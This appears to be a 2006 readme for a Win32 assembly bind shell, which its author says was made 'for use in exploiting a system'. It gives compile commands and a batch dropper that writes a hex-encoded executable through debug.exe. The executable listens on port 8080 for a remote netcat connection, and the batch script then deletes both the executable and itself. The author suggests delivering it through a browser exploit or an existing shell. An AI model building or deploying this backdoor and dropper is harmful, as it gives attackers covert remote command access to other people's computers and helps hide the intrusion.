File     :    Mini Bind Shell

Language :    Win32 ASM

FileSize :    2kb

D.O.B.   :    February 22, 2006  

Description:  CMD line shell in masm that binds/listens on a port

I made this in 2006 for use in exploiting a system, once executed this binds to port on the 
computer allowing the attacker to connect to the specified port remotely with netcat


How Compile:
Get MASM installed
From a CMD Prompt type the following:

c:\masm32\bin\ml /c /coff minishell.asm

c:\masm32\bin\link /SUBSYSTEM:WINDOWS /RELEASE /MERGE:.data=.text /MERGE:.rdata=.text /MERGE:.idata=.text /SECTION:.text,EWR /FILEALIGN:512 minishell.obj


Test it:
c:\minishell.exe 8080


Also if you wanted to use this in a batch file so you can paste it over a previous shell or use with a browser exploit that allows you to execute arbitrary files
Copy/Paste the code below to bind.bat:


echo off && echo n 1.dll >123.hex && echo e 0100 >>123.hex

echo 4d 5a 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 50 45 00 00 4c 01 02 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 0f 01 0b 01 00 00 00 02 00 00 00 00 00 00 00 00 00 00 67 42 00 00 10 00 00 00 00 10 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 50 00 00 00 02 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00  >>123.hex 

echo e 0180 >>123.hex && echo 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 63 42 00 00 14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex 

echo e 0200 >>123.hex && echo 00 00 00 00 00 00 00 00 4d 45 57 00 46 12 d2 c3 00 30 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 02 d2 75 db 8a 16 eb d4 00 10 00 00 00 40 00 00 77 02 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 be 1c 40 40 00 8b de ad ad 50 ad 97 b2 80 a4 b6 80 ff 13 73 f9 33 c9 ff 13 73 16 33 c0 ff 13 73 21 b6 80 41 b0 10 ff 13  >>123.hex 

echo e 0280 >>123.hex && echo 12 c0 73 fa 75 3e aa eb e0 e8 72 3e 00 00 02 f6 83 d9 01 75 0e ff 53 fc eb 26 ac d1 e8 74 2f 13 c9 eb 1a 91 48 c1 e0 08 ac ff 53 fc 3d 00 7d 00 00 73 0a 80 fc 05 73 06 83 f8 7f 77 02 41 41 95 8b c5 b6 00 56 8b f7 2b f0 f3 a4 5e eb 9b ad 85 c0 75 90 ad 96 ad 97 56 ac 3c 00 75 fb ff 53 f0 95 56 ad 0f c8 40 59 74 ec 79 07 ac 3c 00 75 fb 91 40 50 55 ff 53 f4 ab 75 e7 c3 00 00 00 00 00  >>123.hex 

echo e 0300 >>123.hex && echo 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 38 42 00 00 45 42 00 00 00 00 00 00 00 40 40 00 30 01 40 00 00 10 40 00 00 10 40 00 68 1c fa 31 40 03 6a 01 e8 fc 86 02 f9 f5 30 ba 18 fc fb bf 14 b2 c7 1f 6a 91 02 06 bd 3c 0c 02 e8 b0 23 a3 60 f6 59 66 c7 05 58 ce 4f 02 15 3a 19 e8 d8 5d 50 d9 aa 86 3d 66 a3 5a 31 c8 3c 5c a0 01 14 6a 10 68 29 14 ff 35 36 14 e8 82 12 29 05 0d 94 81 5e d0 0f ca  >>123.hex 

echo e 0380 >>123.hex && echo 60 5c c5 a1 1e 05 88 3c 30 be c2 2a 44 51 45 04 ea 2d 14 fe 28 9f 42 68 48 93 a9 45 31 46 fb 28 e1 08 a5 8b 0b 85 46 14 e8 26 5f 07 c3 cc ff 25 20 1a 81 bb 2a 14 06 43 0c 21 1c 90 18 c8 10 64 04 4e cc 20 55 8b ec 81 c4 3f 7c fe f1 0c 56 57 e8 3a c7 89 03 45 fc 33 c9 8b 75 a9 ac 3c c0 74 07 e8 22 f2 f7 03 41 eb f4 51 d1 e9 90 e1 58 3b 01 c1 74 0b 5f 5e b8 03 10 c9 c2 08 e1 86 49 8d  >>123.hex 

echo e 0400 >>123.hex && echo bd 3c 70 e5 43 2a 09 cf 2f e0 02 b0 20 aa eb 73 f2 28 8d 85 15 39 8b f0 36 f8 33 2a 33 eb 1b 8b 03 66 32 07 ef 22 65 20 4d fe 22 11 e1 28 2d ed 94 08 83 b9 dc b7 30 4b 74 fb 3b 3a 4d 08 a8 15 59 65 1d 67 0a 4c 13 41 1d 0f 14 eb e6 aa 0d 36 07 19 87 48 f4 9d 7f c0 55 73 11 8b 7d 0c c6 17 b8 02 7f 82 a2 13 9d 68 b0 a0 58 34 33 0d 46 0d e6 d1 f7 e1 fe 58 a3 ee e7 44 bb 1f 16 a9 ce 11  >>123.hex 

echo e 0480 >>123.hex && echo 04 de 55 01 3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70 d2 8a 06 46 3d 3c 02 b3 12 0e f7 df 90 eb 0b 2c 30 19 8d 0c 89 06 48 83 2d 0a c0 75 f1 e8 04 11 33 51 c2 38 a8 92 52 e1 06 00 00 30 40 00 63 30 6d 64 00 81 3f 40 00 0c 38 20 40 03 77 73 32 5f 33 98 2e 64 6c e3 c0 80 61 71 63 1b 65 70 74 10 e1 69 73 db ca 6e 01 57 53 41 cb f9 61 72 f0 75 70 cf 18 68 23 6f 6e 73 1d 0e 62 69 94 64 19  >>123.hex 

echo e 0500 >>123.hex && echo 9f c3 63 6b 65 74 bf 06 ff 03 e1 b1 91 1a 72 6e cd 6c 58 4a 47 c3 36 43 6f 6d 8b 61 37 5a 4c 62 cc 4c 80 fc 72 ed f7 3b a8 50 6f 6c ce 73 3b 21 00 00 00 00 00 00 81 3f 40 00 4c 6f 61 64 4c 69 62 72 61 72 79 41 00 47 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0c 40 00 00 e9 ec be ff ff 00 00 00 02 00 00 00 0c 40 00 00  >>123.hex 

echo r cx >>123.hex && echo 0477 >>123.hex && echo w >>123.hex && echo q >>123.hex && debug<123.hex && copy 1.dll bind.exe

rem *********CHANGE PORT NUMBER HERE******

bind.exe 8080

deleteit:

del bind.exe

IF EXIST bind.exe GOTO deleteit

del %0 
